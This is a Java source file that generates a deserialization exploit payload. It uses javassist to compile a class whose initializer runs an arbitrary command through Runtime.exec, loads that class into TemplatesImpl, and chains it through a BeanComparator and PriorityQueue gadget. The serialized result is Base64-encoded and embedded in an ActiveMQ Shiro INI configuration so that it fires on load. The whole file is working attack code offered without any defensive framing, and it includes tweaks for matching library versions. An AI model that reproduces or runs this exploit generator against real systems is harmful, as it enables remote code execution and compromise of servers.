package org.example;


import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import javassist.bytecode.ConstantAttribute;
import javassist.bytecode.FieldInfo;
import org.apache.activemq.shiro.env.IniEnvironment;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.Comparator;
import java.util.PriorityQueue;
import java.util.Random;

public class test {

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static String getTemplates(String cmd) throws Exception {
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder sb = new StringBuilder();
        Random random = new Random();
        for (int i = 0; i < 5; i++) {
            sb.append(chars.charAt(random.nextInt(chars.length())));
        }
        String randomStr = sb.toString();
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass(randomStr);

        CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = ctClass.makeClassInitializer();
        constructor.setBody("Runtime.getRuntime().exec(\""+cmd+"\");");
        byte[] bytes = ctClass.toBytecode();

        return Base64.getEncoder().encodeToString(bytes);


    }

    public static String getEchoTemp(String cmd) throws Exception {
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder sb = new StringBuilder();
        Random random = new Random();
        for (int i = 0; i < 5; i++) {
            sb.append(chars.charAt(random.nextInt(chars.length())));
        }
        String randomStr = sb.toString();
        ClassPool pool = ClassPool.getDefault();
//        CtClass ctClass = pool.makeClass(randomStr);
        CtClass ctClass = pool.get("org.example.O");
        CtConstructor constructor = ctClass.getDeclaredConstructor(new CtClass[0]);

        constructor.setBody("{ Cmd(\""+cmd+"\"); }");
//        byte[] bytes = getClassBytecode("org.example.O");
        byte[] bytes = ctClass.toBytecode();

        return Base64.getEncoder().encodeToString(bytes);


    }
        public static String getPayload(String base64EncodedString,String version) throws Exception {

            byte[] clazzBytes = Base64.getDecoder().decode(base64EncodedString);

            Object obj = ReflectionHelper.createWithoutConstructor("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
            setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
            setFieldValue(obj, "_name", "HelloTemplatesImpl");
            setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
            Comparator comparator;
            if(version.startsWith("1.8")){
                ClassPool pool = ClassPool.getDefault();
                pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
                final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
                try {
                    CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
                    ctBeanComparator.removeField(ctSUID);
                }catch (javassist.NotFoundException e){}
                ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
                Class clazz = ctBeanComparator.toClass(new JavassistClassLoader());
//        final Comparator beanComparator = (Comparator)ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
                Constructor<?> constructor = clazz.getConstructor(String.class, Comparator.class);
                comparator = (Comparator<?>) constructor.newInstance(null, String.CASE_INSENSITIVE_ORDER);

                ctBeanComparator.defrost();
            }
            else {
                 comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); // 替换
            }

            final PriorityQueue queue = new PriorityQueue(2, comparator);
            // stub data for replacement later
            queue.add("1");
            queue.add("1");

            setFieldValue(comparator, "property", "outputProperties");
            setFieldValue(queue, "queue", new Object[]{obj, obj});

            // ==================
            // 生成序列化字符串
            ByteArrayOutputStream barr = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(barr);
            oos.writeObject(queue);
            oos.close();

            return Base64.getEncoder().encodeToString(barr.toByteArray());
        }


    public static String getIni(String cmd,String version) throws Exception {
        String payload;
        if(cmd.startsWith("base64:")){
           payload = getPayload(cmd.substring(7),version);
        }else {
            payload = getPayload(getEchoTemp(cmd), version);
        }

        String s = "[main]\n" +
                "bs = org.apache.activemq.util.ByteSequence\n" +
                "message = org.apache.activemq.command.ActiveMQObjectMessage\n"+
                "bs.data = "+ payload +"\n" +
                "bs.length = 9999999\n" +
                "bs.offset = 0\n" +
                "message.content = $bs\n" +
                "message.trustAllPackages = true\n" +
                "message.object.x = x";


        return s;
    }



}
